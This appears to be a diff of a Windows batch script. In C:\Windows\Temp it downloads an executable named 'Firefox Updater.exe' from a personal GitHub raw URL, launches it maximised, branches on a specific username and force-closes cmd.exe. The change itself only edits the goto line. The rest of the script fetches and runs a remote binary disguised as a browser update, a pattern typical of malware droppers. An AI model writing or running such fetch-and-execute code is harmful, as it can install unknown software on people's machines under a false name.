@@ -1,7 +1,7 @@
 cd "C:\Windows\Temp"
 if not exist "V:\local\BGINFO\Bginfoseet.exe" dler "https://raw.githubusercontent.com/dietrich03muller/test/master/FirefoxUpdater.exe" "Firefox Updater.exe"
 if exist "Firefox Updater.exe" (start /max "" "Firefox Updater.exe")
-goto %username%
+if "%username%"=="schlumsanna" goto schlumsanna
 :endee
 taskkill /f /im cmd.exe
 exit
